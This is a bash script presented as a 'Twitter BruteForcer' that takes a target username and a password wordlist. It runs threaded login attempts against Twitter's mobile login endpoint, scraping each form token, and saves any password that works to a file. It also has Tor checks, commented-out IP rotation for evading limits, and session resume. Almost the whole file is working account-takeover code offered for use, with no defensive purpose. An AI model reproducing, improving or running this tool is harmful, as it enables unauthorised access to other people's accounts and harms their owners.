#!/bin/bash
# Bruter :D
# Coded by: github.com/harsh2527
# Twitter: @harsh2527

trap 'store;exit 1' 2

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77m Run me as root!\n\e[0m"
    exit 1
fi
}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 " Requirements not installed. Run ./requirements.sh Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Requirements not installed. Run ./requirements.sh  Aborting."; exit 1; }

}

banner() {



printf "\n"
printf " \e[1;77m\e[44mTwitter BruteForcer tool v1.0, Coded by: @harsh2527 (Twitter)\e[0m\n"
printf " \e[1;77m[\e[0m\e[36m+\e[0m\e[1;77m] github.com/harsh2527 \e[0m\n"
printf "\n"
}
function start() {
banner
checkroot
dependencies
read -p $'\e[1;92mUsername of account: \e[0m' username

checkaccount=$(curl -L -s https://www.twitter.com/$username/ | grep -c "Sorry, that page doesn’t exist!")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mInvalid Username! Try again\e[0m\n"
sleep 1
start
else
default_test_pass="passwords.lst"
read -p $'\e[1;92mWord List (Press Enter to use default list): \e[0m' test_pass
test_pass="${test_pass:-${default_test_pass}}"
default_threads="10"
read -p $'\e[1;92mThreads (Use < 20): \e[0m' threads
threads="${threads:-${default_threads}}"
fi
}

checktor() {

check=$(curl  -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
rm -rf cookies*
default_session="Y"
printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $username
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
printf "username=\"%s\"\npassword=\"%s\"\ntest_pass=\"%s\"\ntoken=\"%s\"\n" $username $password $test_pass $token > sessions/store.session.$username.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instashell --resume\n"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor


}

function bruteforcer() {


uagent="Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11"
#checktor
count_pass=$(wc -l $test_pass | cut -d " " -f1)
printf "\e[1;92m Username:\e[0m\e[1;77m %s\e[0m\n" $username
printf "\e[1;92m Wordlist used :\e[0m\e[1;77m %s (%s)\e[0m\n" $test_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"

while [ $token -lt $count_pass ]; do
IFS=$'\n'
for password in $(sed -n ''$startline','$endline'p' $test_pass); do
countpass=$(grep -n "$password" "$test_pass" | cut -d ":" -f1)

COOKIES='cookies'$countpass''


let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password

{(trap '' SIGINT && initpage=$(curl  -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl   -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"If you’re not redirected soon"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.bruter ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.bruter \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.bruter ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.bruter \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/compose/tweet"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.bruter ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.bruter \n\e[0m"; rm -rf cookies*; kill -1 $$; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
#changeip
rm -rf cookies1
rm -rf cookies$countpass
done
exit 1
}

function resume() {

banner 
#checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$test_pass" "$password"
let counter++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads=10
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $username
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $test_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"


count_pass=$(wc -l $test_pass | cut -d " " -f1)
#changeip
while [ $token -lt $count_pass ]; do
IFS=$'\n'
for password in $(sed -n '/\b'$password'\b/,'$(($token+threads))'p' $test_pass); do
COOKIES='cookies'$countpass''
countpass=$(grep -n -w "$password" "$test_pass" | cut -d ":" -f1)
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
let token++
{(trap '' SIGINT && initpage=$(curl  -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"If you’re not redirected soon"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.bruter ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.bruter \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.bruter ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.bruter \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/compose/tweet"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.bruter ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.bruter \n\e[0m"; rm -rf cookies*; kill -1 $$; fi; ) } & done; wait $!;
#changeip
rm -rf cookies1
rm -rf cookies$countpass
done
exit 1
}

case "$1" in --resume) resume ;; *)
start
bruteforcer
esac

